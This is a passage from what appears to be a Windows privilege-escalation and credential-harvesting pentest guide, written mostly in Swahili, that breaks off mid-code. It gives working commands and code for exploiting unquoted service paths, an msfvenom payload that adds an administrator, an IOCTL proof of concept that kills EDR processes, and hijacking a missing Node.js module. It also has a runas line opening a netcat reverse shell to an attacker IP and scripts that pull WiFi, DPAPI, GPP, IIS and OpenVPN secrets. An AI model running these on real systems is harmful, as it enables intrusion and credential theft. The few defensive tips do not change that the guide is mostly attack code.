C:\Program Files\Some Folder\Service.exe
```
Orodhesha paths zote za service zisizo na quotation marks, ukiondoa zile zinazomilikiwa na built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono service binary kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows inaruhusu watumiaji kubainisha actions zitakazochukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa ili kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Kagua **permissions of the binaries** (labda unaweza ku-overwrite moja na kufanya privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani ya config ili kusoma faili maalum au ikiwa unaweza kurekebisha binary fulani ambayo itatekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kupata weak folder/files permissions kwenye system ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ hu-autoload DLL yoyote ya plugin iliyo ndani ya subfolder zake za `plugins`. Ikiwa kuna portable/copy install inayoweza kuandikwa, kuacha malicious plugin kunatoa automatic code execution ndani ya `notepad++.exe` kwenye kila launch (ikiwemo kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza ku-overwrite registry au binary fulani ambayo itatekelezwa na user mwingine.**\
**Soma** ukurasa **ufuatao** ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta **third party weird/vulnerable** drivers zinazowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Kinga za waendelezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha caller context kwa shughuli zenye haki maalum. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au handle returns.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na fikiria brokered models badala ya direct kernel privileges.

Mawazo ya ugunduzi kwa watetezi
- Fuatilia user-mode opens za majina ya device ya kutia shaka (mfano, \\ .\\amsdk*) na specific IOCTL sequences zinazoashiria abuse.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na dumisha own allow/deny lists.

## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder iliyo kwenye PATH** unaweza kuweza hijack DLL inayopakiwa na process na **escalate privileges**.

Angalia permissions za folda zote zilizo ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking kupitia `C:\node_modules`

Hii ni toleo la **Windows uncontrolled search path** linaloathiri programu za **Node.js** na **Electron** wanapofanya import ya moja kwa moja kama `require("foo")` na module inayotarajiwa iko **missing**.

Node hutatua packages kwa kupanda juu kwenye tree ya directory na kuangalia folders za `node_modules` kwenye kila parent. Kwenye Windows, hilo panda linaweza kufika hadi root ya drive, kwa hiyo programu iliyozinduliwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kuchunguza:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` ya kisiri mbaya (au package folder) na kusubiri **higher-privileged Node/Electron process** itafute dependency iliyokosekana. Payload inatekelezwa ndani ya security context ya process ya mwathiriwa, hivyo hili linakuwa **LPE** kila mara lengo linapoendeshwa kama administrator, kutoka kwenye elevated scheduled task/service wrapper, au kutoka kwenye auto-started privileged desktop app.

Hii ni ya kawaida hasa wakati:

- dependency imeelezwa kwenye `optionalDependencies`
- third-party library inafunga `require("foo")` ndani ya `try/catch` na kuendelea baada ya kushindwa
- package iliondolewa kwenye production builds, haikujumuishwa wakati wa packaging, au ilishindwa kusakinishwa
- vulnerable `require()` ipo ndani kabisa ya dependency tree badala ya kuwa kwenye code kuu ya application

### Hunting vulnerable targets

Tumia **Procmon** kuthibitisha resolution path:

- Filter by `Process Name` = target executable (`node.exe`, EXE ya Electron app, au wrapper process)
- Filter by `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na mwisho wa successful open chini ya `C:\node_modules`

Useful code-review patterns in unpacked `.asar` files or application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Tambua **jina la kifurushi kilichokosekana** kutoka Procmon au ukaguzi wa source.
2. Tengeneza root lookup directory ikiwa bado haipo:
```powershell
mkdir C:\node_modules
```
3. Achia module yenye jina kamili linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Chochea programu ya mwathiriwa. Ikiwa programu inajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya kweli ya moduli za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndio sehemu inayoweza kutumiwa tena: tafuta tu **missing bare import** yoyote ambayo mchakato wa Node/Electron wa Windows wenye ruhusa za juu uta-resolve.

### Detection and hardening ideas

- Onya wakati mtumiaji anaunda `C:\node_modules` au anaandika faili mpya za `.js`/packages hapo.
- Tafuta michakato ya high-integrity ikisoma kutoka `C:\node_modules\*`.
- Pakia dependencies zote za runtime ndani ya production na kagua matumizi ya `optionalDependencies`.
- Pitia code ya third-party kwa mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima optional probes wakati library inaunga mkono hilo (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka legacy `utf-8-validate` probe kwa `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizo hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Kagua **restricted services** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, tengeneza sheria, zima, zima...)**

Zaidi[ amri za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itauliza kupitia GUI kama `nc` iruhusiwe na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault huhifadhi vitambulisho vya mtumiaji kwa ajili ya servers, websites na programs nyingine ambazo **Windows** inaweza **kumuingiza mtumiaji moja kwa moja**. Mwanzoni, hii inaweza kuonekana kama sasa watumiaji wanaweza kuhifadhi vitambulisho vyao vya Facebook, Twitter, Gmail n.k., ili viingie moja kwa moja kupitia browsers. Lakini sivyo.

Windows Vault huhifadhi vitambulisho ambavyo Windows inaweza kutumia kumuingiza mtumiaji moja kwa moja, maana yake ni kwamba **Windows application yoyote inayohitaji credentials kufikia resource** (server au website) **inaweza kutumia hii Credential Manager** & Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila wakati.

Isipokuwa applications zinawasiliana na Credential Manager, sidhani kama inawezekana kwao kutumia credentials za resource fulani. Hivyo, kama application yako inataka kutumia vault, inapaswa kwa njia fulani **kuwasiliana na credential manager na kuomba credentials za resource hiyo** kutoka kwenye default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguzi za `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya usimbaji fiche wa data kwa symmetric, na hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche wa symmetric wa asymmetric private keys. Usimbaji huu hutumia siri ya mtumiaji au ya mfumo ili kuongeza entropy kwa kiasi kikubwa.

**DPAPI huwezesha usimbaji fiche wa keys kupitia symmetric key inayotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji za domain ya mfumo.

Encrypted user RSA keys, kwa kutumia DPAPI, huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **DPAPI key, iliyoko pamoja na master key inayolinda private keys za mtumiaji katika faili ileile**, kwa kawaida huwa na bytes 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo kuzuia kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na arguments zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**credentials files** zilizo protected by the master password kwa kawaida hupatikana katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili ku-decrypt.\
Unaweza **kutoa nyingi DPAPI** **masterkeys** kutoka kwenye **memory** kwa kutumia module `sekurlsa::dpapi` (kama wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumiwa kwa **scripting** na kazi za automation kama njia ya kuhifadhi encrypted credentials kwa urahisi. Credentials hizo zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza tu ku-decryptiwa na mtumiaji yuleyule kwenye computer ileile ambazo ziliundwa juu yake.

Ili **decrypt** PS credentials kutoka kwenye file iliyo nazo unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyoifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizokaribuni Kuendeshwa
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishaji vinaendeshwa kwa **SYSTEM privileges**, vingi vina udhaifu wa **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Vifunguo vya Host vya Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Vifunguo vya SSH katika registry

Vifunguo vya faragha vya SSH vinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys` kwa hiyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukikuta ingizo lolote ndani ya njia hiyo huenda ni SSH key iliyohifadhiwa. Imehifadhiwa kwa njia ya encrypted lakini inaweza decrypted kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu technique hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haijaendeshwa na unataka ianze automatically wakati wa boot endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana technique hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kupitia ssh kwenye machine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Hifadhi za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele kilipatikana hapo awali ambacho kiliruhusu kusambaza akaunti za local administrator maalum kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML ndani ya SYSVOL, zingeweza kufikiwa na user yeyote wa domain. Pili, passwords ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia default key ya umma iliyorekodiwa, zingeweza kufichuliwa na user yeyote aliyethibitishwa. Hii iliweka hatari kubwa, kwani ingeweza kuruhusu users kupata elevated privileges.

Ili kupunguza hatari hii, function ilitengenezwa ili kuchanganua locally cached GPP files zenye field ya "cpassword" ambayo si tupu. Baada ya kupata faili kama hilo, function hu-decrypt password na kurudisha custom PowerShell object. Object hii inajumuisha details za GPP na location ya faili, kusaidia katika utambuzi na kurekebisha udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
